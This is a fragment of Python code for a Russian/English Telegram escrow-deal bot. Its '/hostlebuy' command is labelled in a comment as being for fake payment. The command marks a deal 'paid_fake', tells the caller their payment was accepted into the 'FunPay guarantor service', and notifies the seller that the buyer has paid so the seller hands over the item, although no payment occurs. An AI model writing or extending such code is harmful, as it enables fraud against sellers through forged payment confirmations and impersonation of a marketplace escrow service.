...
async def create_deal_callback(callback: CallbackQuery):
    lang = user_languages.get(callback.from_user.id, "ru")
    text = "🛡️ <b>Создание сделки</b>\n\nВыберите тип сделки:" if lang == "ru" else "🛡️ <b>Create Deal</b>\n\nSelect deal type:"
    await safe_edit_message(callback, text, deal_type_keyboard_ru if lang == "ru" else deal_type_keyboard_en)
...
# --- КОМАНДА /HOSTLEBUY ДЛЯ ФЕЙК ОПЛАТЫ ---
@dp.message(Command("hostlebuy"))
async def hostlebuy_command(message: Message):
    args = message.text.split()
    if len(args) < 2:
        await message.answer("❌ Введите ID сделки: `/hostlebuy id12345`", parse_mode=ParseMode.MARKDOWN)
        return
    ...
    if deal_id in active_deals:
        ...
        # Если у покупателя нет username, используем его ID
        buyer_display = f"@{message.from_user.username}" if message.from_user.username else f"ID: {message.from_user.id}"
        
        deal["status"] = "paid_fake"
        deal["buyer_id"] = message.from_user.id
        
        # Уведомление покупателю (тому, кто ввел команду)
        await message.answer(
            f"✅ <b>Оплата по сделке #{deal_id} принята!</b>\n"
            f"Средства зачислены в гарант-сервис FunPay.", 
        ...
        seller_text = (
            f"💰 <b>Покупатель ({buyer_display}) оплатил сделку #{deal_id}!</b>\n\n"
            f"Передайте товар покупателю и нажмите кнопку подтверждения отправки."
        ) if seller_lang == "ru" else (
            f"💰 <b>Buyer ({buyer_display}) paid for deal #{deal_id}!</b>\n\n"
            f"Deliver the item and press the confirmation button."
        )
        
        # Кнопка для продавца (используем ту, что уже есть в твоем коде)
        await bot.send_message(seller_id, seller_text, reply_markup=seller_gift_keyboard, parse_mode=ParseMode.HTML)
    else:
        await message.answer(f"❌ Сделка с ID <code>{deal_id}</code> не найдена.", parse_mode=ParseMode.HTML)
    ...
    if user_id in user_deals:
        ...
        if deal["step"] == "amount":
            try:
                ...
                text = "📝 Введите описание сделки:" if lang == "ru" else "📝 Enter deal description:"
